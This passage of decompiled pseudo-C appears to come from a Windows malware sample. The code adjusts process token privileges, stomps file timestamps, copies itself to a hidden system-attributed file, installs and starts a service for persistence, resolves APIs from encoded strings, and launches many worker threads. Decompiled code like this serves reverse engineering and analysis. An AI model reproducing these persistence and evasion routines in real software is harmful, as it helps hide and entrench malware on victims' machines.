		}
		word32 edi_76;
		fn00401808(fp - 0x18, out edi_76);
	}
	return;
}

// 00405449: void fn00405449(Stack Eq_4 dwArg04, Stack Eq_4 dwArg08)
void fn00405449(Eq_4 dwArg04, Eq_4 dwArg08)
{
	Eq_8 eax_17 = dwArg04;
	if (dwArg04 == null)
		eax_17 = GetCurrentProcess();
	if (OpenProcessToken(eax_17, 0x28, fp + 0x04) != 0x00)
	{
		if (LookupPrivilegeValueA(0x00, dwArg08, fp - 0x10) != 0x00)
		{
			AdjustTokenPrivileges(dwArg04, 0x00, fp - 0x24, 0x10, fp - 0x0664, fp - 0x14);
			if (GetLastError() == 0x00)
				AdjustTokenPrivileges(dwArg04, 0x00, fp - 0x0664, 0x10, null, null);
		}
		CloseHandle(dwArg04);
	}
	return;
}

// 00405522: void fn00405522(Register ptr32 ebp, Stack Eq_4 dwArg04)
void fn00405522(ptr32 ebp, Eq_4 dwArg04)
{
	Eq_8 eax_31 = CreateFileA(dwArg04, 0xC0000000, 0x01, null, 0x03, 0x20, null);
	if (eax_31 != null)
	{
		GetSystemTime(fp - 0x1C);
		fn004047B6(0x00);
		if (wLoc14 - (word16) ((uint32) ((uint64) ((uint32) fn004047B6(0x00)) % 0x18)) <= 0x00)
			wLoc16 = wLoc16 - 0x01;
		ptr32 esp_128 = fp - 0x30;
		if (wLoc16 - (word16) ((uint32) ((uint64) ((uint32) fn004047B6(0x00)) % 0x1C)) <= 0x00)
		{
			fn004047B6(0x00);
			esp_128 = fp - 0x34;
		}
		word32 * esp_141 = esp_128 - 0x04;
		*esp_141 = 0x00;
		uint64 edx_eax_149 = (uint64) (uint32) fn004047B6(dwArg00);
		*(esp_141 - 0x04) = 0x0C;
		*(esp_141 - 0x04) = fp - 0x0C;
		*(esp_141 - 0x08) = fp - 0x1C;
		SystemTimeToFileTime(*(esp_141 - 0x08), *(esp_141 - 0x04));
		*(esp_141 - 0x04) = fp - 0x0C;
		*(esp_141 - 0x08) = fp - 0x0C;
		*(esp_141 - 0x0C) = fp - 0x0C;
		*(esp_141 - 0x10) = (HANDLE *) eax_31;
		SetFileTime(*(esp_141 - 0x10), *(esp_141 - 0x0C), *(esp_141 - 0x08), *(esp_141 - 0x04));
		*(esp_141 - 0x04) = (HANDLE *) eax_31;
		CloseHandle(*(esp_141 - 0x04));
	}
	return;
}

// 004055FE: Register word32 fn004055FE(Register ptr32 ebp, Register out ptr32 ebxOut, Register out ptr32 esiOut, Register out ptr32 ediOut)
word32 fn004055FE(ptr32 ebp, ptr32 & ebxOut, ptr32 & esiOut, ptr32 & ediOut)
{
	fn004047B6(0x01);
	fn004076F0(4798444, 0x00, 0x0104);
	fn004076F0(4798184, 0x00, 0x0104);
	fn004076F0(4797924, 0x00, 0x0104);
	fn004076F0(4797664, 0x00, 0x0104);
	fn004076F0(4797404, 0x00, 0x0104);
	fn00403634(0x0040F0D4, 0x2266, 0x0040F0D0, 0x00);
	word32 esi_75;
	word32 edi_76;
	word32 ebx_77 = fn00402680(0x004938F8, out esi_75, out edi_76);
	Eq_23 eax_79 = GetVersion();
	globals->dw493900 = edi_76;
	globals->t4938F0 = eax_79 & 0x80000000;
	GetVersionExA(fp - 0x98);
	if (dwLoc94 == 0x05 && dwLoc90 == ebx_77)
		globals->dw493900 = ebx_77;
	word32 eax_105;
	byte * edi_92;
	word32 ebx_93 = fn00404A18(ebx_77, fp - 0x04, esi_75, out edi_92);
	*(fp - 0xAC) = 0x0007D000;
	byte * eax_98 = fn00407F8F(dwArg00);
	globals->ptr4933D8 = eax_98;
	if (eax_98 == edi_92)
		eax_105 = 0x00;
	else
	{
		*(fp - 0xAC) = 0x0007D000;
		*(fp - 0xB0) = (byte **) edi_92;
		*(fp - 0xB4) = (byte **) eax_98;
		fn004076F0(dwArg00, bArg04, dwArg08);
		word32 ebp_132;
		word32 edi_133;
		word32 ebx_134 = fn004057BE(ebx_93, out ebp_132, out edi_133);
		*(fp - 0xB8) = ebx_134;
		*(fp - 188) = 0x00410E04;
		*(fp - 0xC0) = (union Eq_23 *) fn0040347E(dwArg00, dwArg04);
		*(fp - 0xC4) = edi_133;
		fn00405449(dwArg00, dwArg04);
		eax_105 = ebx_134;
	}
	word32 edi_110;
	*ediOut = *(fp - 0xA8);
	word32 esi_112;
	*esiOut = *(fp - 0xA4);
	word32 ebx_114;
	*ebxOut = *(fp - 0xA0);
	return eax_105;
}

// 00405705: void fn00405705(Register ptr32 ebp, Stack Eq_4 dwArg04, Stack Eq_4 dwArg08)
void fn00405705(ptr32 ebp, Eq_4 dwArg04, Eq_4 dwArg08)
{
	fn0040174B();
	ptr32 ebp_121 = fp - 0x04;
	word32 ecx_22;
	struct Eq_997 * eax_23 = fn0040174E(fp - 0x18, dwArg04, fp - 0x08, 0x00, out ecx_22);
	if (eax_23 != null)
	{
		uint32 esi_130 = 0x1014;
		if (dwLoc08 >= 0x1000)
		{
			Eq_23 eax_100 = fn00407840(dwArg08);
			if (dwLoc08 > 4294962200)
			{
				do
				{
					if (fn00408420(dwArg08, eax_23 + esi_130 / 0x0028, eax_100) == 0x00)
					{
						Eq_4 edi_149 = eax_23 + (esi_130 + 0x00) / 0x0028;
						fn00403634(edi_149, 0x2266, edi_149 - 0x04, SLICE(edi_149 - 0x04, byte, 24));
						word32 esi_168;
						word32 edi_169;
						ebp_121 = fn00407C00(edi_149, (word32) dwArg08 + 0x0014, 0x2266, out esi_168, out edi_169);
						*(fp - 0x40) = edi_149 - 0x04;
						word32 edi_173;
						word32 esi_174 = fn004035A1(esi_168, out edi_173);
						*(fp - 0x44) = edi_149 - 0x04;
						*(fp - 0x48) = esi_174;
						*(fp - 0x4C) = edi_173;
						fn004035D8(dwArg00, dwArg04, dwArg08, bArg0B);
						break;
					}
					esi_130 = esi_130 + 0x01;
				} while (esi_130 < dwLoc08 + ~0x03E7);
			}
			*(fp - 0x28) = 0x01;
		}
		word32 edi_86;
		fn00401808(ebp_121 - 0x14, out edi_86);
	}
	return;
}

// 004057BE: Register word32 fn004057BE(Register word32 ebx, Register out ptr32 ebpOut, Register out ptr32 ediOut)
word32 fn004057BE(word32 ebx, ptr32 & ebpOut, ptr32 & ediOut)
{
	Eq_1916 eax_26 = LoadLibraryA(fn0040347E(0x00410B93, 0x02));
	if (eax_26 != null)
	{
		globals->t493908 = GetProcAddress(eax_26, fn0040347E(0x00410C93, 0x01));
		globals->t493904 = GetProcAddress(eax_26, fn0040347E(0x00410C93, 0x04));
		globals->t49390C = GetProcAddress(eax_26, fn0040347E(0x00410C93, 0x05));
	}
	ptr32 esp_132;
	fn0040347E(0x00410B93, 0x03);
	Eq_1916 eax_51 = LoadLibraryA(*esp_43);
	if (eax_51 != null)
	{
		*(esp_132 - 0x04) = 0x03;
		*(esp_132 - 0x08) = 0x00410C93;
		Eq_23 eax_123 = fn0040347E(dwArg00, dwArg04);
		*(esp_132 - 0x04) = (union Eq_23 *) eax_123;
		*(esp_132 - 0x08) = (HMODULE *) eax_51;
		word32 ebx_133;
		word32 ebp_134;
		word32 esi_135;
		word32 edi_136;
		word32 ecx_137;
		word32 eax_138;
		byte SZO_139;
		byte C_140;
		byte Z_141;
		esi_48();
		globals->dw493910 = eax_138;
	}
	word32 * esp_61 = esp_132 - 0x04;
	*esp_61 = 4263368;
	word32 ebx_64;
	word32 ebp_65;
	<anonymous> * esi_66;
	word32 edi_67;
	word32 ecx_68;
	word32 eax_69;
	byte SZO_70;
	byte C_71;
	byte Z_72;
	word32 * esp_108;
	ebx_46();
	if (eax_69 != 0x00)
	{
		*(esp_108 - 0x04) = 0x01;
		*(esp_108 - 0x08) = 4263368;
		Eq_23 eax_99 = fn0040347E(dwArg00, dwArg04);
		*(esp_108 - 0x04) = (union Eq_23 *) eax_99;
		*(esp_108 - 0x08) = eax_69;
		word32 ebx_109;
		word32 ebp_110;
		word32 esi_111;
		word32 edi_112;
		word32 ecx_113;
		word32 eax_114;
		byte SZO_115;
		byte C_116;
		byte Z_117;
		esi_66();
		globals->dw493914 = eax_114;
	}
	struct Eq_3028 * esp_84 = esp_108 + 0x01;
	word32 edi_83;
	*ediOut = *esp_108;
	word32 ebp_87;
	*ebpOut = esp_84->dw0004;
	return esp_84->dw0008;
}

// 00405B0F: Register word32 fn00405B0F(Register ptr32 ebp, Register Eq_4 edi, Stack word32 dwArg04, Register out ptr32 ediOut)
word32 fn00405B0F(ptr32 ebp, Eq_4 edi, word32 dwArg04, ptr32 & ediOut)
{
	*ediOut = edi;
	word32 eax_168;
	fn0040174B();
	Eq_4 ecx_27;
	struct Eq_997 * eax_28 = fn0040174E(fp - 0x1C, dwArg04, fp - 0x0C, 0x01, out ecx_27);
	if (eax_28 != null)
	{
		fn004078BB(ecx_27, fp - 0x04, edi, dwArg04, fp - 288);
		*(fp - 0x0448) = fp - 808;
		*(fp - 1100) = fp - 288;
		fn00407760(dwArg00);
		*(fp - 0x0450) = fp - 0x042C;
		*(fp - 0x0454) = fp - 288;
		fn00407760(dwArg00);
		*(fp - 0x021F) = *(fp - 0x021F) & 0x00;
		*(fp - 1112) = fp - 0x0223;
		*(fp - 1116) = fp - 288;
		fn00407760(dwArg00);
		*(fp - 0x0460) = 0x004101DC;
		*(fp - 0x0464) = fp - 288;
		fn00407760(dwArg00);
		*(fp - 1128) = fp - 0x08;
		*(fp - 1132) = *(fp - 0x0C);
		*(fp - 0x0470) = (struct Eq_997 **) eax_28;
		Eq_4 ebp_123;
		if (fn0040756C(fp - 0x04, ebp, dwArg00, dwArg04, dwArg08, out ebp_123) != 0x00)
		{
			word32 edi_133;
			word32 esi_134 = fn00401808(ebp_123 - 0x18, out edi_133);
			*(fp - 0x0434) = *(ebp_123 - 0x04);
			*(fp - 1080) = esi_134;
			*(fp - 0x043C) = ebp_123 - 0x011C;
			fn00403DC6(dwArg00, dwArg04, dwArg08);
			*(fp - 0x0440) = esi_134;
			word32 edi_145;
			word32 ebp_146 = fn00407BEB(ebp_123, dwArg00, out edi_145);
			*(fp - 0x0434) = (union Eq_4 *) GetCommandLineA();
			*(fp - 1080) = ebp_146 - 0x011C;
			word32 esi_148 = 0x00;
			word32 eax_157 = fn004047E2(dwArg00, dwArg04);
			if (eax_157 != 0x00)
			{
				*(fp - 0x0434) = ~0x00;
				*(fp - 1080) = eax_157;
				WaitForSingleObject(*(fp - 1080), *(fp - 0x0434));
				*(fp - 0x0434) = ebp_146 - 0x011C;
				fn00403F05(dwArg00);
				*(fp - 0x0434) = 0x01;
				esi_148 = *(fp - 0x0434);
			}
			eax_168 = esi_148;
			return eax_168;
		}
		word32 edi_131;
		fn00401808(ebp_123 - 0x18, out edi_131);
	}
	eax_168 = 0x00;
	return eax_168;
}

// 00406DFD: Register ptr32 fn00406DFD(Register word32 ebx, Register ptr32 ebp, Register word32 esi, Register word32 edi, Register out ptr32 ediOut)
ptr32 fn00406DFD(word32 ebx, ptr32 ebp, word32 esi, word32 edi, ptr32 & ediOut)
{
	fn00407F60(9092, dwLoc04);
	GetModuleFileNameA(null, fp + 0x04, 0x0104);
	SetFileAttributesA(4797924, 0x20);
	Eq_105 eax_42 = CopyFileA(fp + 0x04, 4797924, 0x00);
	SetFileAttributesA(4797924, 0x20);
	Eq_23 esi_28 = 4797924;
	ptr32 esp_317 = fp - 0x10;
	if (eax_42 != 0x00)
	{
		word32 edi_289;
		ebp = fn00407C00(dwArg00, dwArg04, dwArg08, out esi_28, out edi_289);
		fn00405705(ebp, dwArg00, dwArg04);
		fn00404FC5(ebp, dwArg00, dwArg04);
		fn004047B6(dwArg00);
		fn0040406E(dwArg00, dwArg04);
		esp_317 = fp - 0x14;
	}
	Eq_23 ebx_257;
	word32 esi_255;
	struct Eq_3389 * esp_263;
	union Eq_23 * esp_58 = esp_317 - 0x04;
	*esp_58 = (union Eq_23 *) esi_28;
	fn00405522(ebp, dwArg00);
	*esp_58 = 0x27;
	*(esp_58 - 0x04) = (union Eq_23 *) esi_28;
	SetFileAttributesA(*(esp_58 - 0x04), *esp_58);
	if (globals->t4938F0 != ebx_257)
	{
		*(esp_263 - 0x04) = esi_255;
		*(esp_263 - 0x08) = 4797404;
		*(esp_263 - 0x0C) = 4797664;
		*(esp_263 - 0x10) = 0x80000002;
		fn0040464B(dwArg00, dwArg04, dwArg08, dwArg0C);
		*(esp_263 - 0x14) = 0x01;
		*(esp_263 - 0x18) = 0x00410B93;
		*(esp_263 - 0x04) = (union Eq_23 *) fn0040347E(dwArg00, dwArg04);
		Eq_1916 eax_237 = LoadLibraryA(*(esp_263 - 0x04));
		*(esp_263 - 0x04) = 0x00410C93;
		*(esp_263 - 0x08) = (HMODULE *) eax_237;
		Eq_1916 ebp_239 = eax_237;
		Eq_23 eax_244 = GetProcAddress(*(esp_263 - 0x08), *(esp_263 - 0x04));
		struct Eq_3389 * esp_245 = esp_263;
		if (eax_244 != ebx_257)
		{
			*(esp_263 - 0x04) = 0x01;
			*(esp_263 - 0x08) = (union Eq_23 *) ebx_257;
			eax_244();
			esp_245 = esp_263 - 0x08;
		}
		HMODULE * esp_260 = esp_245 - 0x04;
		*esp_260 = (HMODULE *) ebp_239;
		FreeLibrary(*esp_260);
		esp_263 = (struct Eq_3389 *) ((char *) esp_260 + 0x04);
	}
	if (esp_263->t0010 != ebx_257)
	{
		if (globals->t4938F0 != ebx_257)
		{
			union Eq_23 * esp_129 = esp_263 - 0x04;
			*esp_129 = (union Eq_23 *) ebx_257;
			*(esp_129 - 0x04) = esi_255;
			fn004047E2(dwArg00, dwArg04);
		}
		else if (globals->t4938F8 == ebx_257)
		{
			struct Eq_3584 * esp_142 = esp_263 - 0x04;
			esp_142->t0000.u0 = 0x02;
			*(esp_142 - 0x04) = (union Eq_23 *) ebx_257;
			*(esp_142 - 0x08) = (union Eq_23 *) ebx_257;
			Eq_23 eax_148 = OpenSCManagerA(*(esp_142 - 0x08), *(esp_142 - 0x04), esp_142->t0000);
			esp_142->t0000 = ebx_257;
			*(esp_142 - 0x04) = (union Eq_23 *) ebx_257;
			*(esp_142 - 0x08) = (union Eq_23 *) ebx_257;
			*(esp_142 - 0x0C) = (union Eq_23 *) ebx_257;
			*(esp_142 - 0x10) = (union Eq_23 *) ebx_257;
			*(esp_142 - 0x14) = esi_255;
			*(esp_142 - 0x18) = (union Eq_23 *) ebx_257;
			*(esp_142 - 0x1C) = 0x02;
			*(esp_142 - 0x20) = 0x0110;
			*(esp_142 - 0x24) = (union Eq_23 *) ebx_257;
			*(esp_142 - 0x28) = 4797404;
			*(esp_142 - 44) = 4797404;
			*(esp_142 - 0x30) = (union Eq_23 *) eax_148;
			esp_142->t0014 = eax_148;
			CreateServiceA(*(esp_142 - 0x30), *(esp_142 - 44), *(esp_142 - 0x28), *(esp_142 - 0x24), *(esp_142 - 0x20), *(esp_142 - 0x1C), *(esp_142 - 0x18), *(esp_142 - 0x14), *(esp_142 - 0x10), *(esp_142 - 0x0C), *(esp_142 - 0x08), *(esp_142 - 0x04), esp_142->t0000);
			esp_142->t0000 = esp_142->t0014;
			CloseServiceHandle(esp_142->t0000);
			esp_142->t0000.u0 = 0x01;
			*(esp_142 - 0x04) = (union Eq_23 *) ebx_257;
			*(esp_142 - 0x08) = (union Eq_23 *) ebx_257;
			Eq_23 eax_191 = OpenSCManagerA(*(esp_142 - 0x08), *(esp_142 - 0x04), esp_142->t0000);
			esp_142->t0000.u0 = 0x10;
			*(esp_142 - 0x04) = 4797404;
			*(esp_142 - 0x08) = (union Eq_23 *) eax_191;
			Eq_23 eax_200 = OpenServiceA(*(esp_142 - 0x08), *(esp_142 - 0x04), esp_142->t0000);
			esp_142->t0000 = ebx_257;
			*(esp_142 - 0x04) = (union Eq_23 *) ebx_257;
			*(esp_142 - 0x08) = (union Eq_23 *) eax_200;
			StartServiceA(*(esp_142 - 0x08), *(esp_142 - 0x04), esp_142->t0000);
			esp_142->t0000 = eax_200;
			CloseServiceHandle(esp_142->t0000);
			esp_142->t0000 = eax_191;
			CloseServiceHandle(esp_142->t0000);
		}
		*(esp_263 - 0x04) = 0x01;
	}
	word32 edi_102;
	*ediOut = esp_263->dw0000;
	return esp_263->ptr0008;
}

// 004071C3: void fn004071C3()
void fn004071C3()
{
	while (true)
		Sleep(~0x00);
}

// 004072F2: void fn004072F2()
void fn004072F2()
{
	CreateThread(null, 0x00, &globals->t4015FF, 0x00, 0x00, fp - 0x08);
	CreateThread(null, 0x00, &globals->t406608, 0x00, 0x00, fp - 0x08);
	CreateThread(null, 0x00, &globals->t406DDE, 0x00, 0x00, fp - 0x08);
	CreateThread(null, 0x00, &globals->t406066, 0x00, 0x00, fp - 0x08);
	CreateThread(null, 0x00, &globals->t4071CD, 0x00, 0x00, fp - 0x08);
	CreateThread(null, 0x00, &globals->t406FD5, 0x00, 0x00, fp - 0x08);
	Eq_2 ebx_110 = 0x00;
	do
	{
		CreateThread(null, 0x00, &globals->t406F88, ebx_110, 0x00, fp - 0x08);
		ebx_110 = ebx_110 + 0x01;
	} while (ebx_110 < 0x1A);
	fn004071C3();
	return;
}

// 004073E2: Register word32 fn004073E2(Register ptr32 ebp, Register out ptr32 ediOut)
word32 fn004073E2(ptr32 ebp, ptr32 & ediOut)
{
	ptr32 esp_13;
	ptr32 ebp_14;
	byte SCZO_15;
	word32 eax_16;
	byte SZO_17;
	byte C_18;
	byte Z_19;
	word32 ecx_20;
	word32 edi_21;
	word32 ebx_22;
	word32 esi_23;
	WS2_32.dll!Ordinal_115();
	word32 ebx_24;
	word32 esi_25;
	word32 edi_26;
	if (fn004055FE(ebp_14, out ebx_24, out esi_25, out edi_26) != 0x00)
	{
		Eq_4 edi_44;
		ptr32 ebp_45 = fn00406DFD(ebx_24, ebp_14, esi_25, edi_26, out edi_44);
		if (globals->b4100D4 != 0x00)
		{
			*(esp_13 - 0x04) = 0x004100D4;
			word32 edi_79;
			if (fn00405B0F(ebp_45, edi_44, dwArg00, out edi_79) != 0x00)
				return 0x00;
		}
		if (globals->t4938F8 != 0x00)
		{
			*(ebp_45 - 0x08) = *(ebp_45 - 0x08) & 0x00;
			*(ebp_45 - 0x04) = *(ebp_45 - 0x04) & 0x00;
			*(ebp_45 - 0x10) = 4797404;
			*(esp_13 - 0x04) = ebp_45 - 0x10;
			*(ebp_45 - 0x0C) = 4223939;
			StartServiceCtrlDispatcherA(*(esp_13 - 0x04));
		}
		word32 edi_57;
		if (fn00404C49(ebp_45, out edi_57) != 0x00)
			fn004072F2();
	}
	return 0x00;
}

// 0040756C: Register (ptr byte) fn0040756C(Register (ptr word32) ebp, Stack ptr32 dwArg00, Stack Eq_4 dwArg04, Stack Eq_4 dwArg08, Stack word32 dwArg0C, Register out ptr32 ebpOut)
byte * fn0040756C(word32 * ebp, ptr32 dwArg00, Eq_4 dwArg04, Eq_4 dwArg08, word32 dwArg0C, ptr32 & ebpOut)
{
	byte * eax_107;
	ui32 eax_19 = *dwArg04;
	Eq_4 edx_185 = 0x00;
	uint32 dwLoc08_195 = 0x00;
	if (dwArg08 < (eax_19 << 0x03) + 0x04)
		eax_107 = null;
	else
	{
		if (true)
		{
			struct Eq_4128 * esi_188 = dwArg04 + 0x01 + 0x01;
			ui32 dwArg04_189 = eax_19;
			do
			{
				Eq_4 ecx_199 = esi_188->dw0000;
				if (edx_185 < ecx_199)
				{
					word32 ecx_222 = ecx_199 - edx_185;
					edx_185 = (word32) edx_185 + ecx_222;
					dwLoc08_195 = dwLoc08_195 + ecx_222;
				}
				word32 eax_207 = esi_188->dw0000;
				if (true)
					edx_185 = (word32) edx_185 + eax_207;
				ui32 v15_215 = dwArg04_189 - 0x01;
				esi_188 = esi_188 + 0x01;
				dwArg04_189 = v15_215;
			} while (v15_215 != 0x00);
		}
		uint32 eax_83 = dwArg08 - (eax_19 << 0x03);
		uint32 eax_89 = eax_83 + ~0x03 - (eax_19 << 0x03);
		if (dwLoc08_195 < eax_89 + ~0x03)
		{
			uint32 eax_182 = eax_89 + ~0x03 - dwLoc08_195;
			edx_185 = (word32) edx_185 + eax_182 + (eax_182 - dwLoc08_195);
		}
		*dwArg0C = (union Eq_4 *) edx_185;
		byte * esi_121 = null;
		Eq_4210 dwLoc08_101[] = dwLoc08_195 & 0x00;
		eax_107 = fn00407F8F(edx_185);
		int32 edi_108 = dwArg04 + ((eax_19 << 0x03) + 0x04);
		ui32 ebx_109 = eax_19;
		if (true)
		{
			struct Eq_4185 * ecx_140 = dwArg04 + 0x01;
			do
			{
				while (esi_121 < ecx_140->dw0000)
				{
					Mem154[eax_107 + esi_121:byte] = Mem106[dwLoc08_101 + edi_108:byte];
					esi_121 = esi_121 + 0x01;
					dwLoc08_101 = (Eq_4210 (*)[]) (dwLoc08_101 + 0x01)->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000;
				}
				uint32 edx_159 = 0x00;
				if (ecx_140->dw0004 > 0x00)
				{
					do
					{
						Mem175[eax_107 + esi_121:byte] = Mem106[eax_107 + esi_121:byte] & 0x00;
						esi_121 = esi_121 + 0x01;
						edx_159 = edx_159 + 0x01;
					} while (edx_159 < ecx_140->dw0004);
				}
				ecx_140 = ecx_140 + 0x01;
				ebx_109 = ebx_109 - 0x01;
			} while (ebx_109 != 0x00);
		}
		Eq_4210 ecx_126[] = dwLoc08_101;
		if (dwLoc08_101 < eax_89 + ~0x03)
		{
			word32 esi_130 = esi_121 + eax_107 + eax_107;
			do
			{
				*esi_130 = (byte) (&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&ecx_126[edi_108].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00];
				esi_130 = esi_130 + 0x01;
				ecx_126 = (Eq_4210 (*)[]) (ecx_126 + 0x01)->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000;
			} while (ecx_126 < eax_89 + ~0x03);
		}
	}
	return eax_107;
	word32 ebp_61;
	*ebpOut = *ebp;
	return eax_107;
}

// 004076F0: void fn004076F0(Stack Eq_4 dwArg04, Stack byte bArg08, Stack Eq_23 dwArg0C)
void fn004076F0(Eq_4 dwArg04, byte bArg08, Eq_23 dwArg0C)
{
	uint32 edx_3 = dwArg0C;
	if (dwArg0C == 0x00)
		return;
	byte al_22 = bArg08;
	ui32 eax_23 = (word32) bArg08;
	byte * edi_27 = dwArg04;
	if (dwArg0C >= 0x04)
	{
		ui32 ecx_52 = -dwArg04;
		ui32 ecx_53 = ecx_52 & 0x03;
		if ((ecx_52 & 0x03) != 0x00)
		{
			edx_3 = dwArg0C - (ecx_52 & 0x03);
			do
			{
				*edi_27 = bArg08;
				edi_27 = edi_27 + 0x01;
				ecx_53 = ecx_53 - 0x01;
			} while (ecx_53 != 0x00);
		}
		Eq_4269 eax_65 = eax_23 * 0x01010000 + eax_23 * 0x0101;
		al_22 = (byte) eax_65;
		edx_3 = edx_3 & 0x03;
		uint32 ecx_69 = edx_3 >> 0x02;
		if (ecx_69 != 0x00)
		{
			while (ecx_69 != 0x00)
			{
				*edi_27 = (byte) eax_65;
				edi_27 = edi_27 + 0x04;
				ecx_69 = ecx_69 - 0x01;
			}
			if (edx_3 == 0x00)
				return;
		}
	}
	do
	{
		*edi_27 = al_22;
		edi_27 = edi_27 + 0x01;
		edx_3 = edx_3 - 0x01;
	} while (edx_3 != 0x00);
	return;
}

// 00407750: Register word32 fn00407750(Stack Eq_4 dwArg04)
word32 fn00407750(Eq_4 dwArg04)
{
	return fn004077C1(dwArg04);
}

// 00407760: void fn00407760(Stack Eq_4 dwArg04)
void fn00407760(Eq_4 dwArg04)
{
	union Eq_4311 * ecx_22 = dwArg04;
	if ((dwArg04 & 0x03) != 0x00)
	{
		while (true)
		{
			ecx_22 = (union Eq_4311 *) ((char *) ecx_22 + 0x01);
			if (*ecx_22 == 0x00)
				break;
			if ((ecx_22 & 0x03) == 0x00)
				goto l0040777C;
		}
	}
	else
	{
l0040777C:
		do
		{
			word32 eax_35 = *ecx_22;
			ecx_22 = (union Eq_4311 *) ((char *) ecx_22 + 0x04);
		} while (((eax_35 ^ ~0x00 ^ eax_35 + 0x7EFEFEFF) & 0x81010100) == 0x00);
		ui32 eax_44 = *(ecx_22 - 0x04);
		byte ah_46 = SLICE(eax_44, byte, 8);
		if ((byte) eax_44 == 0x00)
		{
			fn004077C1(ecx_22 - 0x04);
			return;
		}
		if (ah_46 == 0x00)
		{
			fn004077C1(ecx_22 - 0x03);
			return;
		}
		if ((eax_44 & 0x00FF0000) == 0x00)
		{
			fn004077C1(ecx_22 - 0x02);
			return;
		}
		if ((eax_44 & 0xFF000000) != 0x00)
			goto l0040777C;
	}
	struct Eq_4308 * edi_29 = ecx_22 - 0x01;
	fn004077C1(edi_29);
	return;
}

// 004077C1: Register (ptr Eq_4308) fn004077C1(Register (ptr Eq_4308) edi)
Eq_4308 * fn004077C1(Eq_4308 * edi)
{
fn004077C1_entry:
	byte dl_24
	byte * ecx_3 = v3->ptr000C
	branch (ecx_3 & 0x03) == 0x00 l004077E6
	goto l004077CD
l004077C1:
l004077CD:
	dl_24 = *ecx_3
	ecx_3 = ecx_3 + 0x01
	branch dl_24 == 0x00 l00407838
l004077D4:
	edi->b0000 = dl_24
	edi = edi + 0x01
	branch (ecx_3 & 0x03) != 0x00 l004077CD
	goto l004077E6
l004077E1:
	edi->b0000 = (byte) edx_45
	edi = edi + 0x04
l004077E6:
	Eq_4407 edx_45 = *ecx_3
	Eq_4411 eax_41 = *ecx_3
	dl_24 = (byte) edx_45
	byte dh_47 = SLICE(edx_45, byte, 8)
	Eq_4418 dx_48 = (word16) edx_45
	ecx_3 = ecx_3 + 0x04
	branch ((eax_41 ^ ~0x00 ^ (word32) eax_41 + 0x7EFEFEFF) & 0x81010100) == 0x00 l004077E1
l00407800:
	branch dl_24 == 0x00 l00407838
l00407804:
	branch dh_47 == 0x00 l0040782F
l00407808:
	branch (edx_45 & 0x00FF0000) == 0x00 l00407822
l00407810:
	branch (edx_45 & 0xFF000000) == 0x00 l0040781A
	goto l004077E1
l0040781A:
	edi->b0000 = (byte) edx_45
	return v3->ptr0000
l00407822:
	edi->b0000 = (byte) dx_48
	edi[0x02] = (struct Eq_4308) 0x00
	return v3->ptr0000
l0040782F:
	edi->b0000 = (byte) dx_48
	return v3->ptr0000
l00407838:
	edi->b0000 = dl_24
	return v3->ptr0000
fn004077C1_exit:
}

// 00407840: Register ptr32 fn00407840(Stack Eq_4 dwArg04)
ptr32 fn00407840(Eq_4 dwArg04)
{
	union Eq_4477 * ecx_24 = dwArg04;
	if ((dwArg04 & 0x03) != 0x00)
	{
		while (true)
		{
			ecx_24 = (union Eq_4477 *) ((char *) ecx_24 + 0x01);
			if (*ecx_24 == 0x00)
				break;
			if ((ecx_24 & 0x03) == 0x00)
				goto l00407860;
		}
	}
	else
	{
l00407860:
		do
		{
			word32 eax_36 = *ecx_24;
			ecx_24 = (union Eq_4477 *) ((char *) ecx_24 + 0x04);
		} while (((eax_36 ^ ~0x00 ^ eax_36 + 0x7EFEFEFF) & 0x81010100) == 0x00);
		ui32 eax_45 = *(ecx_24 - 0x04);
		byte ah_47 = SLICE(eax_45, byte, 8);
		if ((byte) eax_45 == 0x00)
			return ecx_24 - 0x04 - dwArg04;
		if (ah_47 == 0x00)
			return ecx_24 - 0x03 - dwArg04;
		if ((eax_45 & 0x00FF0000) == 0x00)
			return ecx_24 - 0x02 - dwArg04;
		if ((eax_45 & 0xFF000000) != 0x00)
			goto l00407860;
	}
	return ecx_24 - 0x01 - dwArg04;
}

// 004078BB: Register Eq_4 fn004078BB(Register Eq_4 ecx, Register ptr32 ebp, Register Eq_4 edi, Stack Eq_4 dwArg04, Stack ptr32 dwArg08)
Eq_4 fn004078BB(Eq_4 ecx, ptr32 ebp, Eq_4 edi, Eq_4 dwArg04, ptr32 dwArg08)
{
	Eq_4 ebx_17 = dwArg04;
	Eq_4 ecx_107 = dwArg04;
	if (fn00407840(dwArg04) >= 0x01 && *((word32) dwArg04 + 0x01) == 0x3A)
	{
		if (dwArg08 != null)
		{
			ecx_107 = fn00408977(edi, dwArg08, dwArg04, (struct Eq_4549 *) 0x02, out ebx_17);
			dwArg08->b0002 = dwArg08->b0002 & 0x00;
		}
		ebx_17 = (word32) ebx_17 + 0x02;
	}
	else if (dwArg08 != null)
		dwArg08->b0000 = dwArg08->b0000 & 0x00;
	fp->t0008 = fp->t0008 & 0x00;
	fp->t0004 = ebx_17;
	Eq_4 eax_119 = (word32) ebx_17 + 0x01;
	Eq_4816 (* esi_114)[] = (Eq_4816 (*)[]) 0xFF;
	if (*ebx_17 != 0x00)
	{
		do
		{
			byte cl_187 = *eax_119;
			ecx_107 = DPB(ecx_107, cl_187, 0);
			if ((((word32) cl_187)->b494D61 & 0x04) != 0x00)
				eax_119 = (word32) eax_119 + 0x01;
			else if (cl_187 != 0x2F && cl_187 != 0x5C)
			{
				if (cl_187 == 0x2E)
					*(fp - 0x08) = (union Eq_4 *) eax_119;
			}
			else
			{
				ecx_107 = eax_119;
				fp->t0008 = ecx_107;
			}
			eax_119 = (word32) eax_119 + 0x01;
		} while (*eax_119 != 0x00);
		Eq_4 edi_200 = fp->t0008;
		fp->t0004 = eax_119;
		if (edi_200 != 0x00)
		{
			if (fp->t000C != 0x00)
			{
				Eq_4 edi_216 = edi_200 - ebx_17;
				if (edi_216 >= 0xFF)
